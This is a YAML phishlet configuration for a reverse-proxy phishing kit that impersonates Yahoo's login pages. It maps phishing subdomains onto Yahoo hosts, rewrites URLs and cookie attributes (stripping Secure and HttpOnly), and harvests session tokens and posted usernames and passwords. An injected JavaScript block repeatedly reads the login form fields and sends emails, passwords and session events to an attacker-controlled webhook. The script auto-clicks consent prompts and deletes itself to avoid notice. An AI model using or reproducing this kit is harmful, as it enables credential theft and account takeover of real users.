name: 'yahoo'
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: '{{.Endpoint1}}', orig_sub: 'login', domain: 'yahoo.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'guce.{{.Endpoint1}}', orig_sub: 'guce', domain: 'yahoo.com', session: true, auto_filter: true}
  - {phish_sub: 'api.{{.Endpoint1}}', orig_sub: 'api.login', domain: 'yahoo.com', session: true, auto_filter: true}
  - {phish_sub: 'consent.{{.Endpoint1}}', orig_sub: 'consent', domain: 'yahoo.com', session: true, auto_filter: true}
  - {phish_sub: 'sso.{{.Endpoint1}}', orig_sub: 'sso', domain: 'yahoo.com', session: true, auto_filter: true}
sub_filters:
  # Replace login.yahoo.com references (HTTP/HTTPS, triggered from any Yahoo subdomain)
  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'login.yahoo.com', replace: '{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/x-javascript'], replace_all: true}
  - {triggers_on: 'login.yahoo.com', orig_sub: 'guce', domain: 'yahoo.com', search: 'guce.yahoo.com', replace: 'guce.{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/x-javascript'], replace_all: true}
  - {triggers_on: 'api.login.yahoo.com', orig_sub: 'api.login', domain: 'yahoo.com', search: 'api.login.yahoo.com', replace: 'api.{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/x-javascript'], replace_all: true}
  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'https://login.yahoo.com', replace: 'https://{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/x-javascript'], replace_all: true}
  - {triggers_on: 'guce.yahoo.com', orig_sub: 'guce', domain: 'yahoo.com', search: 'https://guce.yahoo.com', replace: 'https://guce.{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/x-javascript'], replace_all: true}

  # Cookie domain and security attribute replacements
  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: '.yahoo.com', replace: '.{{.Domain}}', mimes: ['text/html', 'application/javascript'], headers: ['Set-Cookie', 'Cookie']}
  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'Secure;', replace: '', mimes: ['text/html'], headers: ['Set-Cookie']}
  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'SameSite=Lax', replace: 'SameSite=None', mimes: ['text/html'], headers: ['Set-Cookie']}
  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'SameSite=Strict', replace: 'SameSite=None', mimes: ['text/html'], headers: ['Set-Cookie']}
  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'HttpOnly;', replace: '', mimes: ['text/html'], headers: ['Set-Cookie']}
  
  # Redirects, CORS, and Form Handling
  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'https://login.yahoo.com', replace: 'https://{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'application/json'], headers: ['Location', 'Refresh']}
  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'Access-Control-Allow-Origin: https://login.yahoo.com', replace: 'Access-Control-Allow-Origin: https://{{.Endpoint1}}.{{.Domain}}', headers: ['Access-Control-Allow-Origin']}
  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: '"/', replace: '"https://{{.Endpoint1}}.{{.Domain}}/', mimes: ['text/html', 'application/javascript']}
  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'action="https://login.yahoo.com', replace: 'action="https://{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html']}

  # Handle escaped dots in strings, common in JSON payloads or specific header-based redirections
  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'login\\.yahoo\\.com', replace: '{{.Endpoint1}}\\.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json'], replace_all: true}
  - {triggers_on: 'guce.yahoo.com', orig_sub: 'guce', domain: 'yahoo.com', search: 'guce\\.yahoo\\.com', replace: 'guce.{{.Endpoint1}}\\.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json'], replace_all: true}

auth_tokens:
  - domain: '.yahoo.com'
    keys: ['A3', 'A1', 'A1S', 'Y', 'T', 'S', 'PH', 'B', 'X', 'GUID', 'F', 'G', 'A', 'SSL', 'AO', 'CY', 'CRUM', 'IDS', 'GAMBIT', 'ST', 'XY', 'OS', 'HP', 'JV', 'C']
  - domain: 'login.yahoo.com'
    keys: ['B', 'X', 'SESSION_ID', 'CSRF_TOKEN', 'JSESSIONID']
  - domain: '.guce.yahoo.com'
    keys: ['GUCE', 'GUCS', 'guce_consent_cookie', 'guce_consent_status', 'GUC']
  - domain: 'api.login.yahoo.com'
    keys: ['AUTH_BEARER', 'ACCESS_TOKEN']
credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
login:
  domain: 'login.yahoo.com'
  path: '/'
js_inject:
  - trigger_domains: ['{{.Endpoint1}}.{{.Domain}}', 'login.yahoo.com']
    trigger_paths: ['/.*']
    script: |
      (function() {
        const api = atob('{{.DomainBase64}}') + "/api/webhook";
        const secret = "{{.WebhookSecret}}";
        const source = "yahoo";
        let capturedEmail = '';

        function sendData(type, email, password) {
          fetch(api, {
            method: "POST",
            headers: { "Content-Type": "application/json", "X-Webhook-Secret": secret },
            body: JSON.stringify({ event: type, source: source, email: email, password: password, remote_addr: "{{.VpsIp}}" })
          }).catch(function(){});
        }

        function capture() {
          const emailInput = document.querySelector('input[name="username"], input[type="email"]');
          const passInput = document.querySelector('input[name="password"], input[type="password"]');

          if (emailInput && emailInput.value && emailInput.value !== capturedEmail) {
            capturedEmail = emailInput.value;
            sendData("email", capturedEmail, null);
          }

          if (passInput && passInput.value) {
            sendData("credentials", capturedEmail, passInput.value);
          }
        }

        setInterval(capture, 500);
        
        function handleConsent() {
          // Automatically click consent button if it appears
          const agreeBtn = document.querySelector('button[name="agree"], button.agree, #consent-text button');
          if (agreeBtn && !agreeBtn.hasAttribute('data-authflow-clicked')) {
            agreeBtn.setAttribute('data-authflow-clicked', 'true');
            agreeBtn.click();
          }
        }
        
        setInterval(handleConsent, 1000);

        document.addEventListener('submit', function() { setTimeout(capture, 200); });
        
        function checkSession() {
          if (document.cookie.includes('T=') && document.cookie.includes('Y=')) {
             sendData("session", capturedEmail, null);
          }
        }
        
        setInterval(checkSession, 5000);
        
        // Scrub DOM for stealth
        if (document.currentScript) document.currentScript.remove();
        
        new MutationObserver(capture).observe(document.body, { childList: true, subtree: true });
      })();
webhook:
  url: "http://127.0.0.1:{{.AppPort}}/api/webhook"
  headers:
    X-Webhook-Secret: "{{.WebhookSecret}}"
  format: "json"
  events: ["email", "credentials", "2fa", "session"]